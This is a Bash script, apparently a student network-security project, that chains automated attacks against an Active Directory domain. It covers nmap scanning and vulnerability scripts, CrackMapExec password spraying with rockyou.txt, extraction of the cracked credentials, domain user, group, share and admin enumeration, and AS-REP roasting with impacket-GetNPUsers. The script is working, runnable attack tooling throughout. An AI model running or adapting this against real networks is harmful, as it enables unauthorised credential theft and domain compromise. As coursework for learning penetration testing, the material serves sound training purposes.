#!/bin/bash

# Projectname and creator:
# Cyber-Security Project 6: NETWORK SECURITY | PROJECT: DOMAINMAPS
# Creator of the project: Hadroxx


# Start of project

# Define color variables
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
WHITE='\e[37m'
RESET='\e[0m'


function BOOT()
{	
 # Checking if the current user is root
if [ "$(whoami)" != "root" ]
	then
		echo "Must be root to run, exiting now..."
	exit
    else
        echo "You are root, continuing..."
fi

# Switch to Norwegian keyboard layout (this can be removed if you have an English keyboard-layout, or changed if you have other keyboard-layouts)
setxkbmap no
echo "[*] Switched to Norwegian keyboard layout."
sleep 1
echo

# Loop to ask if the user has updated Kali
while true; do
    read -p "[?] Have you updated Kali today? (y/n): " ANSWER
    if [[ "$ANSWER" == "Y" || "$ANSWER" == "y" ]]
    then
        echo
        echo -e "${GREEN}[*] KALI updated. Continuing with the script..${RESET}"
        break  # Exit the loop and continue with the script
    elif [[ "$ANSWER" == "N" || "$ANSWER" == "n" ]]
    then
    echo
    echo -e "${RED}[*] KALI not updated. Updating KALI, this will take some time...${RESET}"
        sudo apt-get update -y >/dev/null 2>&1
    echo -e "${GREEN}KALI updated!${RESET}"
        break  # Exit the loop after updating
    fi
done
echo
sleep 2
}




function INPUT()
{
# Asking the user for input and saving it into a variable
get_user_input() {
    echo "[*] To run this script, please input the following:"
    echo
    sleep 1
      # Loop until a valid network range is provided.
      while true
      do
      read -p "[*] Enter the desired network-range to scan (example: 8.8.8.8/24): " NETWORK
      echo
      
      # Validating the network range with nmap
      nmap $NETWORK -sL 2>./ValidNetwork.txt 1>./NetworkScan.txt
      
      # Checking to see if "failed to resolve" is in the output
      if grep -i "failed to resolve" ./ValidNetwork.txt # The file needed to be "grepped" is the ValidNetwork.txt because in here lies the error-messages (the 2> output)
      then
      echo "[!] Network-range is invalid. Please input the correct network-range."
      echo
      else
      echo "[*] Network-range is valid. Continuing the script..."
      break # Exit the loop and continue the script
      fi
      done

    echo
    sleep 1
    read -p "[*] Enter a name for the directory to save all output inside: " DIRECTORY
    echo
    sleep 1
    # Get operation level from the user
	echo "Choose an operation-mode for the script before any actions are executed."

	echo "1. Basic"
	echo "2. Intermediate"
	echo "3. Advanced"

	read -p "Select operation-mode for the script (1 = Basic, 2 = Intermediate, 3 = Advanced) (1-3): " choice
	export choice  # Makes choice accessible globally

    echo
    sleep 1
}

# Loop until the user confirms the input is correct.
while true
do
    get_user_input
    
    # 1.4 Make sure the input is valid.
    echo
    echo
    echo "[*] Desired network-range specified: $NETWORK"
    echo
    echo "[*] Desired output directory name: $DIRECTORY"
    echo
    echo "[*] Desired type of mode (1 = Basic, 2 = Intermediate, 3 = Advanced): $choice"
    echo    
    read -p "[*] Is the input correct? (y/n): " INPUT
    echo
    
    # Check if the user confirmed the input
    if [[ "$INPUT" == "Y" || "$INPUT" == "y" ]]
    then
        echo
        echo "[*] Continuing with the script."
        echo
        break  # Exit the loop and continue the script
    else
        echo
        echo "[!] Input incorrect, please re-enter the information."
        echo
    fi
done




# 1.3. Prompt the user to choose a password list, defaulting to Rockyou if none is specified.

read -p "Do you wish to supply your own password list? (y/n) " REPLY

if [[ $REPLY == "Y" || $REPLY == "y" ]]; then
    while true; do
        read -p "Input the path to your file (example: /home/kali/Desktop/FILE): " PASSLIST
        if [[ -f "$PASSLIST" ]]; then
            echo
            echo -e "${GREEN}[*] Password list set to: $PASSLIST${RESET}"
            echo
            break  # Exit loop if valid file is provided
        else
			echo
            echo -e "${RED}[!] File not found. Please input a valid file path.${RESET}"
            echo
        fi
    done
else
    echo
    sleep 1
    echo -e "${YELLOW}[*] No custom password list supplied. Using /home/kali/Desktop/rockyou.txt${RESET}"
    PASSLIST="/home/kali/Desktop/rockyou.txt"
    echo
fi

export PASSLIST  # PASSLIST is exported globally



 # Username-list promp # 1.3. Prompt the user to choose a password list, defaulting to Rockyou if none is specified.
# Username-list prompt
read -p "Do you wish to supply your own userlist? (y/n) " REPLY

if [[ $REPLY == "Y" || $REPLY == "y" ]]; then
    while true; do
        read -p "Input the path to your file (example: /home/kali/Desktop/FILE): " USERLIST
        if [[ -f "$USERLIST" ]]; then
            echo
            echo -e "${GREEN}[*] Userlist set to: $USERLIST${RESET}"
            echo
            break  # Exit loop if valid file is provided
        else
            echo
            echo -e "${RED}[!] File not found. Please input a valid file path.${RESET}"
            echo
        fi
    done
else
    echo
    sleep 1
    echo -e "${YELLOW}[*] No custom userlist supplied. Using /home/kali/Desktop/rockyou.txt${RESET}"
    USERLIST="/home/kali/Desktop/rockyou.txt"
    echo
fi

export USERLIST  # USERLIST is exported globally


echo "[*] Now creating the output directory $DIRECTORY, where you can locate all the generated data depending on the modes chosen: "
mkdir ./$DIRECTORY
chmod 777 ./$DIRECTORY # The reason I do chmod 777 here is simply to avoid possible issues regarding permissions later on.
mv ./ValidNetwork.txt ./NetworkScan.txt ./$DIRECTORY # Here I'm just moving the .txt files into the newly created directory, so everything is in the same place at the end.
echo
echo
echo "Continuing the scrip based on selected mode"
}



function MODES()
{

# Initiating a scan to grab the live IPs on the network-range for further scanning, enumeration and exploitation
echo -e "${BLUE}[*] Initiating a preliminary NMAP --open scan to scan the network for live IPS. This may take some time...${RESET}"
echo
# To avoid too much clutter/output on the terminal-screen I chose to send the output to dev/null.
nmap $NETWORK --open 2>/dev/null | tee ./$DIRECTORY/OPENPORT_output.txt
echo -e "${GREEN}[*] Open-port scan complete, output saved to OPENPORT_output.txt in $DIRECTORY."
echo
echo "[*] Locating IP-addresses from within the OPENPORT_output.txt file for display, and saving them into ./$DIRECTORY/IPS.txt"
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' ./$DIRECTORY/OPENPORT_output.txt | tee ./$DIRECTORY/IPS.txt
echo
echo -e "Continuing with chosen mode (Basic, Intermediate or Advanced depending on your choice)${RESET}"
#The command for IP-addresses is not one I remember by heart, so I just got it from ChatGPT
echo



# Variable for looping through the IP-addresses from the IPS.txt to use in future scans.
IPS=$(grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' ./$DIRECTORY/IPS.txt)
export IPS # Making IPS a global variable







function basic()
{ 
	echo "[*] Creating Basic Directories."
	mkdir ./Basic
	chmod 777 ./Basic
	mv ./Basic ./$DIRECTORY
	echo
	echo -e "${RED}[*] ----------Initiating Basic Scanning---------- [*]${RESET}" 
	sleep 2
	echo
	
	# Loop through each IP and run nmap, then save the output into separate files
	for i in $IPS
	do
    nmap $i -sV -Pn | tee ./$DIRECTORY/Basic/${i}_PN_output.txt
	done

	echo
	sleep 2
	echo -e "${RED}[*] ----------Initiating Basic Enumeration---------- [*]${RESET}"
	echo
	echo
	sleep 2
	echo -e "${GREEN}[*] Identifying the DHCP server: ${RESET}"
	nmap $NETWORK --script broadcast-dhcp-discover | tee ./$DIRECTORY/Basic/DHCP_IP_output.txt
	echo
	sleep 2
	echo
	echo -e "${YELLOW}[*] Identifying the Domain Controller: ${RESET}"
	echo
	sleep 1
	echo -e "${YELLOW}[!] Now displaying the Domain Controller IP: ${RESET}"
	echo
	sleep 1
	grep "ldap" ./$DIRECTORY/Basic/* -B 10 | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | head -n 1 | tee ./$DIRECTORY/Basic/Domain_Controller_IP.txt
	# Here I grep for ldap within all the files generated from the loop above, as that is what the domain-IP would be using as a service.
	# Then I further filter for its IP address, and display it in the Terminal.
	DC=$(< ./$DIRECTORY/Basic/Domain_Controller_IP.txt)
	export DC # Makes DC as variable globally as it will be used in Intermediate and Advanced functions as well
	echo
	sleep 2
	echo
	
	echo -e "${RED}[*] ----------Initiating Basic Exploitation--------- [*]${RESET}"
	echo
	echo
	sleep 2
	
	echo -e "${RED}[!] Now deploying NSE --vuln script scanning, this may take a while...${RESET}"
	echo
	sleep 2
	
	# Loop through each IP and run nmap --script=vuln, then save the output into separate files
	for i in $IPS
	do
    nmap $i -sV --script=vuln | tee ./$DIRECTORY/Basic/${i}_VULN_output.txt
	done
	echo
	echo -e "${GREEN}[!] Vuln-script scanning is complete"
	echo
	echo
	sleep 2
	echo -e "${GREEN}Basic-mode scripting is complete, now saving all output to a pdf-file${RESET}"
	cat ./$DIRECTORY/Basic/* | sort | uniq > ./$DIRECTORY/Basic/output.txt
	sleep 1
	enscript ./$DIRECTORY/Basic/output.txt -p ./$DIRECTORY/Basic/output.ps
	sleep 1
	ps2pdf ./$DIRECTORY/Basic/output.ps ./$DIRECTORY/Basic/output.pdf
	echo
	# Here I sleep the script so the changes will have a second to take hold
	echo "Cleaning up the generated output.txt and output.ps files in $DIRECTORY/Basic, keeping only the output.pdf file"
	rm -rf ./$DIRECTORY/Basic/output.txt ./$DIRECTORY/Basic/output.ps
	echo
	echo "Listing the files inside the generated directory $DIRECTORY so far: "
	echo
	echo -e "${YELLOW}$(ls ./$DIRECTORY/*) ${RESET}"
	echo
	echo "End of Basic script"
	echo
	echo
}





function intermediate()
{

	basic; echo -e "${BLUE}[!]Initiating Intermediate mode${RESET}"
	echo
	echo "[*] Creating Intermediate Directories"
	mkdir ./Intermediate
	chmod 777 ./Intermediate
	mv ./Intermediate ./$DIRECTORY
	
	echo
	echo -e "${RED}[*] ----------Initiating Intermediate Scanning---------- [*]${RESET}"
	sleep 2
	echo
	echo "Scanning all 65535 ports on $NETWORK"
	echo
	
	# Loop through each IP and run nmap, then save the output into separate files
	for i in $IPS
	do
    nmap $i -sV -p- | tee ./$DIRECTORY/Intermediate/${i}_ALL_PORTS_output.txt
	done
	
	echo
	echo -e "${RED}[*] ----------Initiating Intermediate Enumeration---------- [*]${RESET}"
	sleep 2
	echo
	echo "Locating wanted services (FTP, SSH, SMB, WinRM, LDAP, RDP):"
	grep -Ei "FTP|SSH|SMB|WinRM|LDAP|RDP" ./$DIRECTORY/Intermediate/* | sed G
	# sed G is simply put here to insert a blank line after each result to make it more orderly in the Terminal
	
	
	echo "Using the following three (3) NSE-script relevant for domain enumeration on the Domain Controller:"
	echo -e "${RED}$(locate /*.nse | grep -i domain) ${RESET}"
	echo
	sleep 1
	echo "Scanning $DC with the specified NSE scripts, this will take time."
    nmap $DC -sV -p- --script=http-cross-domain-policy,smb-enum-domains,whois-domain| tee ./$DIRECTORY/Intermediate/${DC}_ALL_DOMAINSCRIPTS_output.txt
	# Here I run all 3 script simoultaneously on the aquired Domain Controller (DC) IP and save it into files
	echo
	
	echo -e "${RED}[*] ----------Initiating Intermediate Exploitation---------- [*]${RESET}"
	sleep 2
	echo
	echo "Executing domain-wide user and password-spraying to identify weak credentials"
	echo -e "${YELLOW}[*] Running CrackMapExec${RESET}"
	crackmapexec smb $DC -u $USERLIST -p $PASSLIST --continue-on-success | tee ./$DIRECTORY/Intermediate/CRACKMAP_CREDS.txt
	echo -e "${GREEN}[*] CrackMapExec Execution Completed. Results saved into ./$DIRECTORY/Intermediate/CRACKMAP_CREDS.txt${RESET}"
	echo
	echo "Saving the credentials found through CrackMapExec into the following .txt files: "
	echo "DOMAIN_NAME: contains the names of the domains found (example netsec.local)"
	echo "DOMAIN_USER: contains the usernames found (example admin/administrator)"
	echo "DOMAIN_PASSWORD: contains the passwords found (example 123456/qwerty)"
	cat ./$DIRECTORY/Intermediate/CRACKMAP_CREDS.txt | grep -i pwn3d | awk '{print $6}' | awk -F'\\' '{print $1}' > ./$DIRECTORY/Intermediate/DOMAIN_NAME.txt
	cat ./$DIRECTORY/Intermediate/CRACKMAP_CREDS.txt | grep -i pwn3d | awk '{print $6}' | awk -F'[\\\\:]' '{print $2}' > ./$DIRECTORY/Intermediate/DOMAIN_USER.txt
	cat ./$DIRECTORY/Intermediate/CRACKMAP_CREDS.txt | grep -i pwn3d | awk '{print $6}' | awk -F':' '{print $2}' > ./$DIRECTORY/Intermediate/DOMAIN_PASSWORD.txt
	echo
	echo "Displaying found credentials, these are needed for Advanced Mode"
	sleep 2
	echo "Password: $(cat ./$DIRECTORY/Intermediate/DOMAIN_PASSWORD.txt)"
	sleep 2
	echo "Username: $(cat ./$DIRECTORY/Intermediate/DOMAIN_USER.txt)"
	sleep 2
	echo "Domain name: $(cat ./$DIRECTORY/Intermediate/DOMAIN_NAME.txt)"
	sleep 2
	echo
	echo "Turning the found credentials into variables for use in Advanced Mode, wait a moment."
	DOMAIN=$(< ./$DIRECTORY/Intermediate/DOMAIN_NAME.txt)
	export DOMAIN
	USER=$(< ./$DIRECTORY/Intermediate/DOMAIN_USER.txt)
	export USER
	PASSWORD=$(< ./$DIRECTORY/Intermediate/DOMAIN_PASSWORD.txt)
	export PASSWORD
	echo "Variables created for use in Advanced Mode"
	sleep 1
	echo
	

	echo -e "${GREEN}Intermediate-mode scripting is complete, now saving all output to a pdf-file${RESET}"
	cat ./$DIRECTORY/Intermediate/* | sort | uniq > ./$DIRECTORY/Intermediate/output.txt
	sleep 1
	enscript ./$DIRECTORY/Intermediate/output.txt -p ./$DIRECTORY/Intermediate/output.ps
	sleep 1
	ps2pdf ./$DIRECTORY/Intermediate/output.ps ./$DIRECTORY/Intermediate/output.pdf
	echo
	# Here I sleep the script so the changes will have a second to take hold
	echo "Cleaning up the generated output.txt and output.ps files in $DIRECTORY/Intermediate, keeping only the output.pdf file"
	rm -rf ./$DIRECTORY/Intermediate/output.txt ./$DIRECTORY/Intermediate/output.ps
	echo
	echo "Listing the files inside the generated directory $DIRECTORY so far: "
	echo
	echo -e "${YELLOW}$(ls ./$DIRECTORY/*) ${RESET}"
	echo
	echo "End of Intermediate script"
	echo
	echo
	
	
}





function advanced()
{
	intermediate; echo -e "${BLUE}[!]Initiating Advanced mode${RESET}"
	echo
	echo "Creating Advanced Directories"
	mkdir ./Advanced
	chmod 777 ./Advanced
	mv ./Advanced ./$DIRECTORY
	echo
	echo
	sleep 2
	

	echo -e "${RED}[*] ----------Initiating Advanced Scanning---------- [*]${RESET}"
	sleep 2
	echo
	echo "Initiating Masscan on $NETWORK for UDP-analysis"
	for i in $IPS
	do
    masscan $i -pU:0-65535 --rate=10000 | tee ./$DIRECTORY/Advanced/${i}_Masscan_UDP.txt
	done
	echo
	
	
	echo -e "${RED}[*] ----------Initiating Advanced Enumeration---------- [*]${RESET}"
	sleep 2
	echo
	sleep 2
	echo -e "${GREEN}Now starting the enumeration process"
	echo
	echo "All enumerated data will be displayed on the terminal and saved into designated .txt files under ./$DIRECTORY/Advanced"
	echo
	sleep 2
	echo "Enumerating Users on the Domain"
	echo
	crackmapexec smb "$DC" -u "$USER" -p "$PASSWORD" --users | tee ./$DIRECTORY/Advanced/DOMAINUSERS.TXT
	echo
	echo "Sorting enumerated users for Advanced exploitation"
	echo
	cat ./$DIRECTORY/Advanced/DOMAINUSERS.TXT | sort | uniq | awk -F'\\' '{print $2}' | awk '{print $1}' > ./$DIRECTORY/Advanced/SORTED_DOMAINUSERS.TXT
	echo
	echo "Sorting of users completed"
	echo
	sleep 2
	echo
	echo "Enumerating Groups on the Domain"
	echo
	crackmapexec smb "$DC" -u "$USER" -p "$PASSWORD" --groups | tee ./$DIRECTORY/Advanced/DOMAINGROUPS.TXT
	sleep 2
	echo
	echo "Enumerating Shares on the Domain"
	echo
	crackmapexec smb "$DC" -u "$USER" -p "$PASSWORD" --shares | tee ./$DIRECTORY/Advanced/DOMAINSHARES.TXT
	sleep 2
	echo
	echo "Enumerating Password Policy on the Domain"
	echo
	crackmapexec smb "$DC" -u "$USER" -p "$PASSWORD" --pass-pol | tee ./$DIRECTORY/Advanced/DOMAIN_PASS_POLICY.TXT
	sleep 2
	echo
	echo "Enumerating accounts that are members of the Domain Admins group on the Domain (not done yet)"
	echo
	crackmapexec smb "$DC" -u "$USER" -p "$PASSWORD" --groups 'Domain Admins' | tail -n +4 | tee ./$DIRECTORY/Advanced/DOMAIN_ADMINGROUP_MEMBERS.TXT
	sleep 2
	echo
	echo -e "Enumeration complete${RESET}"
	echo
	
	
	
	
	
	
	echo -e "${RED}[*] ----------Initiating Advanced Exploitation---------- [*]${RESET}"
	sleep 2
	echo "Attempting to crack and extract Kerberos tickets using the pre-supplied passwordlist"
	echo
	impacket-GetNPUsers "$DOMAIN"/ -usersfile ./$DIRECTORY/Advanced/SORTED_DOMAINUSERS.TXT -dc-ip "$DC" -request 2>/dev/null | grep '$krb' | tee ./$DIRECTORY/Advanced/KERBEROS_TICKETS.txt
	sleep 2
	
	
	
	
	
	
	
	
	
	
	
	
	echo -e "${GREEN}Advanced-mode scripting is complete, now saving all output to a pdf-file${RESET}"
	cat ./$DIRECTORY/Advanced/* | sort | uniq > ./$DIRECTORY/Advanced/output.txt
	sleep 1
	enscript ./$DIRECTORY/Advanced/output.txt -p ./$DIRECTORY/Advanced/output.ps
	sleep 1
	ps2pdf ./$DIRECTORY/Advanced/output.ps ./$DIRECTORY/Advanced/output.pdf
	echo
	# Here I sleep the script so the changes will have a second to take hold
	echo "Cleaning up the generated output.txt and output.ps files in $DIRECTORY/Advanced, keeping only the output.pdf file"
	rm -rf ./$DIRECTORY/Advanced/output.txt ./$DIRECTORY/Advanced/output.ps
	echo
	echo "Listing the files inside the generated directory $DIRECTORY so far: "
	echo
	echo -e "${YELLOW}$(ls ./$DIRECTORY/*) ${RESET}"
	echo
	echo "End of Advanced script"
	echo
	echo
	
	
	
	
	
	
	
	
	
	
}

# Execute Scanning 
case $choice in
    1) basic ;;
    2) intermediate ;;
    3) advanced ;;
    *) echo "Invalid Scanning choice. Exiting."; exit 1 ;;
esac


}




echo -e "${YELLOW}[*]--------------------START OF PROJECT--------------------[*]${RESET}"
echo
echo
echo -e "${YELLOW}[*]--------------------START-UP--------------------[*]${RESET}"
echo
BOOT
echo
echo -e "${YELLOW}[*]--------------------INPUT--------------------[*]${RESET}"
echo
INPUT
echo
echo -e "${YELLOW}[*]--------------------Modes and Logs--------------------[*]${RESET}"
echo
MODES
echo
echo -e "${YELLOW}[*]--------------------END OF PROJECT--------------------[*]${RESET}"

# End of project
